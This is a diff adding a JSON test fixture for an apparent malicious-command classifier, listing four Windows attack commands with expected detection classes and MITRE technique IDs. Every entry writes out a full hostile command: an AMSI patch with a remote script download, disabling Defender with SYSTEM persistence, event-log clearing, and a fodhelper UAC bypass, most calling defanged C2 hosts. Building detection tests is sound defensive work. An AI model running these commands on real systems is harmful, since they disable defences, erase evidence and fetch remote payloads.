@@ -1,0 +1,46 @@
+[
+  {
+    "id": "amsi-patch-iex-download",
+    "description": "Reflection-based AMSI patch disables AV scanning before IEX payload fetch",
+    "command": "powershell -ep bypass -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); iex (New-Object Net.WebClient).DownloadString('hxxp://c2.sec-updates[.]org/payload.ps1')\"",
+    "expect": {
+      "classes": ["defense_evasion", "loader", "dropper"],
+      "min_confidence": {"defense_evasion": "high", "dropper": "high"},
+      "techniques": ["T1562.001", "T1105"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "defender-disable-persist",
+    "description": "Disables Defender real-time monitoring then installs SYSTEM-level logon persistence",
+    "command": "powershell.exe -ep bypass -c \"Set-MpPreference -DisableRealtimeMonitoring $true; schtasks /create /tn 'WindowsSecurityHealth' /tr 'powershell -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString(\\\"hxxp://c2.telemetry-svc[.]com/agent.ps1\\\"))' /sc onlogon /ru SYSTEM /f\"",
+    "expect": {
+      "classes": ["defense_evasion", "c2_persistence", "dropper"],
+      "min_confidence": {"defense_evasion": "high", "c2_persistence": "high"},
+      "techniques": ["T1562.001", "T1053.005"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "wevtutil-log-clear-multi",
+    "description": "Clears Security, System, Application and PowerShell event logs — anti-forensics",
+    "command": "cmd /c wevtutil cl Security & wevtutil cl System & wevtutil cl Application & wevtutil cl \"Windows PowerShell\" & wevtutil cl Microsoft-Windows-PowerShell/Operational",
+    "expect": {
+      "classes": ["defense_evasion"],
+      "min_confidence": {"defense_evasion": "high"},
+      "techniques": ["T1562.008"]
+    },
+    "reject": {"classes": ["impact", "dropper", "loader"]}
+  },
+  {
+    "id": "uac-bypass-fodhelper",
+    "description": "fodhelper UAC bypass via HKCU ms-settings shell open command registry key",
+    "command": "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /d \"cmd.exe /c powershell -ep bypass -w hidden -c IEX((New-Object Net.WebClient).DownloadString('hxxps://c2[.]xyz/a'))\" /f & fodhelper.exe",
+    "expect": {
+      "classes": ["defense_evasion", "dropper"],
+      "min_confidence": {"defense_evasion": "high"},
+      "techniques": ["T1548.002"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  }
+]
